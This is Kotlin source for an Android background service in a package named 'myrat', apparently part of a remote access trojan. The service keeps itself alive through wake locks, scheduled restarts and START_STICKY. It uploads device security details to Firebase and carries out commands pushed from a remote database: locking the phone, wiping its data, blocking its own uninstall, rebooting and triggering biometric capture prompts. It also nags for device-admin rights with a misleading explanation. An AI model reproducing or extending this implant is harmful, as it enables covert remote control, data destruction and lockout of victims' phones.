package com.myrat.app.service

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.Settings
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.utils.Logger
import java.util.concurrent.Executor

class LockService : Service() {
    private lateinit var deviceId: String
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var keyguardManager: KeyguardManager
    private lateinit var powerManager: PowerManager
    private lateinit var adminComponent: ComponentName
    private lateinit var executor: Executor
    private lateinit var db: com.google.firebase.database.DatabaseReference
    private var biometricReceiver: BroadcastReceiver? = null
    private var deviceAdviceListener: ValueEventListener? = null
    private var lastCommandTime = 0L
    private var wakeLock: PowerManager.WakeLock? = null
    private var isServiceInitialized = false
    private val commandHandler = Handler(Looper.getMainLooper())

    companion object {
        private const val NOTIFICATION_ID = 3
        private const val CHANNEL_ID = "LockServiceChannel"
        private const val COMMAND_DEBOUNCE_MS = 500L
        private const val MAX_RETRY_ATTEMPTS = 3
    }

    override fun onCreate() {
        super.onCreate()
        try {
            Logger.log("🔐 LockService onCreate started")

            // Initialize basic components first
            initializeBasicComponents()

            // Start foreground service immediately
            startForeground(NOTIFICATION_ID, buildNotification())

            // Initialize Firebase and other components
            initializeFirebaseAndComponents()

            // Set up all listeners and functionality
            setupServiceFunctionality()

            isServiceInitialized = true
            Logger.log("✅ LockService successfully initialized")

        } catch (e: Exception) {
            Logger.error("❌ LockService failed to start", e)
            // Don't stop service, try to continue with limited functionality
            isServiceInitialized = false
        }
    }

    private fun initializeBasicComponents() {
        try {
            // Acquire wake lock to keep service running
            acquireWakeLock()

            // Get device ID with fallback
            deviceId = try {
                MainActivity.getDeviceId(this) ?: generateFallbackDeviceId()
            } catch (e: Exception) {
                Logger.error("Failed to get deviceId, using fallback", e)
                generateFallbackDeviceId()
            }

            Logger.log("🔐 LockService initializing for deviceId: $deviceId")

            // Initialize system services
            initializeSystemServices()

        } catch (e: Exception) {
            Logger.error("Failed to initialize basic components", e)
            throw e
        }
    }

    private fun generateFallbackDeviceId(): String {
        return try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                androidId
            } else {
                "lockservice_${System.currentTimeMillis()}_${(1000..9999).random()}"
            }
        } catch (e: Exception) {
            "lockservice_emergency_${System.currentTimeMillis()}"
        }
    }

    private fun initializeSystemServices() {
        try {
            devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: run {
                Logger.error("DevicePolicyManager unavailable")
                throw IllegalStateException("DevicePolicyManager unavailable")
            }
            keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager ?: run {
                Logger.error("KeyguardManager unavailable")
                throw IllegalStateException("KeyguardManager unavailable")
            }
            powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: run {
                Logger.error("PowerManager unavailable")
                throw IllegalStateException("PowerManager unavailable")
            }
            adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            executor = ContextCompat.getMainExecutor(this)
            Logger.log("✅ System services initialized successfully")
        } catch (e: Exception) {
            Logger.error("Failed to initialize system services", e)
            throw e
        }
    }

    private fun initializeFirebaseAndComponents() {
        try {
            // Initialize Firebase with retry mechanism
            var firebaseInitialized = false
            for (attempt in 1..MAX_RETRY_ATTEMPTS) {
                try {
                    db = Firebase.database.getReference()
                    firebaseInitialized = true
                    Logger.log("✅ Firebase initialized successfully in LockService (attempt $attempt)")
                    break
                } catch (e: Exception) {
                    Logger.error("Firebase initialization failed (attempt $attempt)", e)
                    if (attempt < MAX_RETRY_ATTEMPTS) {
                        Thread.sleep(2000) // Wait 2 seconds before retry
                    }
                }
            }

            if (!firebaseInitialized) {
                Logger.error("❌ Firebase initialization failed after $MAX_RETRY_ATTEMPTS attempts")
                // Continue without Firebase for now
            }

        } catch (e: Exception) {
            Logger.error("Error in initializeFirebaseAndComponents", e)
        }
    }

    private fun setupServiceFunctionality() {
        try {
            // Set up biometric result receiver
            setupBiometricResultReceiver()

            // Set up Firebase connection status
            setupFirebaseConnection()

            // Fetch and upload lock details
            fetchAndUploadLockDetails()

            // Listen for device advice commands
            listenForDeviceAdviceCommands()

            // Schedule periodic restart and health checks
            schedulePeriodicTasks()

        } catch (e: Exception) {
            Logger.error("Error setting up service functionality", e)
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "LockService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour
            Logger.log("✅ Wake lock acquired for LockService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock", e)
        }
    }

    private fun schedulePeriodicTasks() {
        try {
            // Schedule service restart every 10 minutes
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, LockService::class.java)
            val pendingIntent = PendingIntent.getService(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // For Android 12+ use exact alarms if permission is granted
                if (alarmManager.canScheduleExactAlarms()) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 10 * 60 * 1000,
                        pendingIntent
                    )
                } else {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 10 * 60 * 1000,
                        pendingIntent
                    )
                }
            } else {
                alarmManager.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 10 * 60 * 1000,
                    10 * 60 * 1000,
                    pendingIntent
                )
            }
            Logger.log("✅ Scheduled periodic restart for LockService")
        } catch (e: Exception) {
            Logger.error("Failed to schedule periodic restart", e)
        }
    }

    private fun setupFirebaseConnection() {
        try {
            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_service").child("connected")
                    .setValue(true)
                    .addOnSuccessListener {
                        Logger.log("✅ Firebase connection status updated")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to set connected status in LockService", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error setting up Firebase connection", e)
        }
    }

    private fun buildNotification(): Notification {
        val channelId = CHANNEL_ID
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    channelId,
                    "Device Lock Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                    description = "Manages device lock and security commands"
                }
                val manager = getSystemService(NotificationManager::class.java)
                manager?.createNotificationChannel(channel)
            }
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Device Lock Service")
                .setContentText("Monitoring device lock commands")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build notification in LockService", e)
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Lock Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        return try {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) {
            Logger.error("Network check failed", e)
            false
        }
    }

    private fun fetchAndUploadLockDetails() {
        try {
            val lockDetails = mapOf(
                "isDeviceSecure" to keyguardManager.isDeviceSecure,
                "biometricStatus" to getBiometricStatus(),
                "biometricType" to getBiometricType(),
                "isDeviceAdminActive" to devicePolicyManager.isAdminActive(adminComponent),
                "lastUpdated" to System.currentTimeMillis(),
                "androidVersion" to Build.VERSION.SDK_INT,
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL,
                "serviceInitialized" to isServiceInitialized,
                "networkAvailable" to isNetworkAvailable()
            )

            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
                    .addOnSuccessListener {
                        Logger.log("✅ Lock details uploaded successfully")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload lock details: ${e.message}")
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error fetching lock details", e)
        }
    }

    private fun getBiometricStatus(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                when (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
                    androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Enrolled"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> "Hardware Unavailable"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_SECURITY_UPDATE_REQUIRED -> "Security Update Required"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_UNSUPPORTED -> "Unsupported"
                    androidx.biometric.BiometricManager.BIOMETRIC_STATUS_UNKNOWN -> "Unknown"
                    else -> "Unknown"
                }
            } catch (e: Exception) {
                Logger.error("Error getting biometric status", e)
                "Error"
            }
        } else {
            "Not Available"
        }
    }

    private fun getBiometricType(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                    "Fingerprint/Face"
                } else {
                    "None"
                }
            } catch (e: Exception) {
                Logger.error("Error getting biometric type", e)
                "Error"
            }
        } else {
            "None"
        }
    }

    private fun listenForDeviceAdviceCommands() {
        try {
            if (!::db.isInitialized) {
                Logger.error("❌ Database not initialized, cannot listen for commands")
                return
            }

            Logger.log("🔄 Setting up device advice command listener...")

            deviceAdviceListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        Logger.log("📨 RTDB snapshot received for device advice")
                        if (!snapshot.exists()) {
                            Logger.log("📭 No data in device advice snapshot")
                            return
                        }

                        // Parse the command data manually since it might not match the data class exactly
                        val action = snapshot.child("action").getValue(String::class.java) ?: run {
                            Logger.error("❌ No action found in command")
                            return
                        }

                        val status = snapshot.child("status").getValue(String::class.java) ?: "unknown"
                        val commandId = snapshot.child("commandId").getValue(String::class.java) ?: "unknown"
                        val timestamp = snapshot.child("timestamp").getValue(Long::class.java) ?: 0L

                        Logger.log("📋 Command received: action=$action, status=$status, commandId=$commandId")

                        if (status != "pending") {
                            Logger.log("⏭️ Ignoring non-pending command: $action (status: $status)")
                            return
                        }

                        if (System.currentTimeMillis() - lastCommandTime < COMMAND_DEBOUNCE_MS) {
                            Logger.log("⏸️ Command ignored due to debounce: $action")
                            return
                        }

                        lastCommandTime = System.currentTimeMillis()
                        Logger.log("🚀 Processing lock command: $action")

                        val command = DeviceAdviceCommand(
                            action = action,
                            commandId = commandId,
                            status = status,
                            timestamp = timestamp
                        )

                        // Process command in background thread with timeout
                        commandHandler.post {
                            processCommandWithTimeout(command)
                        }

                    } catch (e: Exception) {
                        Logger.error("❌ Error processing RTDB command", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("❌ Error listening for commands: ${error.message}")
                }
            }

            db.child("Device").child(deviceId).child("deviceAdvice")
                .addValueEventListener(deviceAdviceListener!!)

            Logger.log("✅ Device advice command listener set up successfully")

        } catch (e: Exception) {
            Logger.error("❌ Failed to set up command listener", e)
        }
    }

    private fun processCommandWithTimeout(command: DeviceAdviceCommand) {
        try {
            Logger.log("⏱️ Processing command with timeout: ${command.action}")

            // Set a timeout for command processing
            val timeoutHandler = Handler(Looper.getMainLooper())
            val timeoutRunnable = Runnable {
                Logger.error("⏰ Command processing timeout: ${command.action}")
                updateCommandStatus(command, "timeout", "Command processing timed out")
            }

            timeoutHandler.postDelayed(timeoutRunnable, 30000) // 30 second timeout

            // Process the command
            val success = processCommand(command)

            // Cancel timeout if command completed
            timeoutHandler.removeCallbacks(timeoutRunnable)

            if (!success) {
                updateCommandStatus(command, "failed", "Command execution failed")
            }

        } catch (e: Exception) {
            Logger.error("❌ Error in processCommandWithTimeout", e)
            updateCommandStatus(command, "error", "Processing error: ${e.message}")
        }
    }

    private fun processCommand(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔧 Processing command: ${command.action}")

            when (command.action) {
                "lock" -> lockDevice(command)
                "unlock" -> notifyUserToUnlock(command)
                "screenOn" -> turnScreenOn(command)
                "screenOff" -> turnScreenOff(command)
                "CaptureBiometricData" -> captureBiometricData(command)
                "BiometricUnlock" -> biometricUnlock(command)
                "wipeThePhone" -> wipeThePhone(command)
                "preventUninstall" -> preventUninstall(command)
                "reboot" -> rebootDevice(command)
                "enableAdmin" -> enableDeviceAdmin(command)
                "getStatus" -> getDeviceStatus(command)
                else -> {
                    Logger.error("❌ Unknown command: ${command.action}")
                    updateCommandStatus(command, "failed", "Unknown command: ${command.action}")
                    false
                }
            }
        } catch (e: Exception) {
            Logger.error("❌ Error processing command: ${command.action}", e)
            updateCommandStatus(command, "error", "Processing error: ${e.message}")
            false
        }
    }

    private fun lockDevice(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔒 Attempting to lock device...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Device locked successfully")
                true
            } else {
                Logger.error("❌ Device admin not active for lockDevice")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Lock device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun notifyUserToUnlock(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔓 Attempting to notify user to unlock...")

            if (keyguardManager.isDeviceLocked) {
                val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                startActivity(intent)
                updateCommandStatus(command, "pending", "Waiting for user unlock")
                Logger.log("✅ Unlock prompt shown")
                true
            } else {
                updateCommandStatus(command, "success", "Device already unlocked")
                Logger.log("✅ Device already unlocked")
                true
            }
        } catch (e: Exception) {
            Logger.error("❌ Failed to notify user to unlock", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun turnScreenOn(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("💡 Attempting to turn screen on...")

            if (!powerManager.isInteractive) {
                val wakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "LockService:ScreenOn"
                )
                wakeLock.acquire(5000) // 5 seconds
                wakeLock.release()
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Screen turned on successfully")
                true
            } else {
                updateCommandStatus(command, "success", "Screen already on")
                Logger.log("✅ Screen already on")
                true
            }
        } catch (e: Exception) {
            Logger.error("❌ Turn screen on failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun turnScreenOff(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🌙 Attempting to turn screen off...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Screen turned off successfully")
                true
            } else {
                Logger.error("❌ Device admin not active for screenOff")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Turn screen off failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun captureBiometricData(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("👆 Attempting to capture biometric data...")

            val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_CAPTURE_BIOMETRIC)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
            updateCommandStatus(command, "pending", "Waiting for biometric data capture")
            Logger.log("✅ Biometric capture prompt shown")
            true
        } catch (e: Exception) {
            Logger.error("❌ Capture biometric data failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun biometricUnlock(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔓 Attempting biometric unlock...")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && hasBiometricPermission()) {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) != androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                    updateCommandStatus(command, "failed", "Biometric authentication not available or enrolled")
                    Logger.error("❌ Biometric not available")
                    return false
                }

                val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                startActivity(intent)
                updateCommandStatus(command, "pending", "Waiting for biometric unlock")
                Logger.log("✅ Biometric unlock prompt shown")
                true
            } else {
                updateCommandStatus(command, "failed", "Biometric authentication not supported or permission denied")
                Logger.error("❌ Biometric not supported")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Biometric unlock failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun wipeThePhone(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🗑️ Attempting to wipe device...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                // Add confirmation delay for safety
                commandHandler.postDelayed({
                    try {
                        devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                        updateCommandStatus(command, "success", null)
                        Logger.log("✅ Device wipe initiated")
                    } catch (e: Exception) {
                        Logger.error("❌ Device wipe execution failed", e)
                        updateCommandStatus(command, "error", "Wipe execution failed: ${e.message}")
                    }
                }, 5000) // 5 second delay
                updateCommandStatus(command, "pending", "Device wipe scheduled in 5 seconds")
                Logger.log("⏳ Device wipe scheduled")
                true
            } else {
                Logger.error("❌ Device admin not active for wipeThePhone")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Wipe device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun preventUninstall(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🛡️ Attempting to prevent uninstall...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Uninstall prevention enabled")
                true
            } else {
                Logger.error("❌ Device admin not active for preventUninstall")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Prevent uninstall failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun rebootDevice(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔄 Attempting to reboot device...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    devicePolicyManager.reboot(adminComponent)
                    updateCommandStatus(command, "success", null)
                    Logger.log("✅ Device reboot initiated")
                    true
                } else {
                    updateCommandStatus(command, "failed", "Reboot not supported on this Android version")
                    Logger.error("❌ Reboot not supported on Android ${Build.VERSION.SDK_INT}")
                    false
                }
            } else {
                Logger.error("❌ Device admin not active for reboot")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Reboot device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun enableDeviceAdmin(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔐 Attempting to enable device admin...")

            promptForDeviceAdmin()
            updateCommandStatus(command, "pending", "Device admin prompt shown")
            Logger.log("✅ Device admin prompt shown")
            true
        } catch (e: Exception) {
            Logger.error("❌ Enable device admin failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun getDeviceStatus(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("📊 Getting device status...")

            fetchAndUploadLockDetails()
            updateCommandStatus(command, "success", "Device status updated")
            Logger.log("✅ Device status updated")
            true
        } catch (e: Exception) {
            Logger.error("❌ Get device status failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun promptForDeviceAdmin() {
        try {
            Logger.log("🔐 Prompting for device admin...")

            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "This permission is required to allow the app to lock the device and manage screen settings.")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            Logger.log("✅ Device admin prompt shown")
        } catch (e: Exception) {
            Logger.error("❌ Failed to show device admin prompt", e)
        }
    }

    private fun updateCommandStatus(command: DeviceAdviceCommand, status: String, error: String?) {
        try {
            if (!::db.isInitialized) {
                Logger.error("❌ Database not initialized, cannot update command status")
                return
            }

            Logger.log("📝 Updating command status: ${command.action} -> $status")

            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis(),
                "processedBy" to "LockService"
            )
            error?.let { updates["error"] = it }

            db.child("Device").child(deviceId).child("deviceAdvice").updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("✅ Updated command status: ${command.action} -> $status")
                }
                .addOnFailureListener { e ->
                    Logger.error("❌ Failed to update command status: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("❌ Failed to update command status", e)
        }
    }

    private fun setupBiometricResultReceiver() {
        try {
            biometricReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    try {
                        val commandId = intent?.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID) ?: run {
                            Logger.error("❌ Biometric result missing commandId")
                            return
                        }
                        val result = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_RESULT) ?: run {
                            Logger.error("❌ Biometric result missing result")
                            return
                        }
                        val action = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION) ?: run {
                            Logger.error("❌ Biometric result missing action")
                            return
                        }
                        val error = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ERROR)
                        Logger.log("📨 Received biometric result: commandId=$commandId, result=$result, action=$action")
                        val command = DeviceAdviceCommand(action = action, commandId = commandId, status = result, error = error)
                        updateCommandStatus(command, result, error)
                    } catch (e: Exception) {
                        Logger.error("❌ Failed to process biometric result", e)
                    }
                }
            }

            val filter = IntentFilter(com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_RESULT)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(biometricReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(biometricReceiver, filter)
            }
            Logger.log("✅ Biometric result receiver registered")
        } catch (e: Exception) {
            Logger.error("❌ Failed to register biometric result receiver", e)
        }
    }

    private fun hasBiometricPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.USE_BIOMETRIC) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.log("🔄 LockService onStartCommand")

        // Refresh wake lock
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            acquireWakeLock()
        } catch (e: Exception) {
            Logger.error("❌ Error refreshing wake lock", e)
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Release wake lock
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_service").child("connected").setValue(false)
                deviceAdviceListener?.let { db.child("Device").child(deviceId).child("deviceAdvice").removeEventListener(it) }
            }
            biometricReceiver?.let { unregisterReceiver(it) }
            Logger.log("✅ LockService destroyed and listeners removed")
        } catch (e: Exception) {
            Logger.error("❌ Error during LockService cleanup", e)
        }
    }

    data class DeviceAdviceCommand(
        val action: String = "",
        val commandId: String = "",
        val status: String = "",
        val timestamp: Long = 0,
        val error: String? = null
    )
}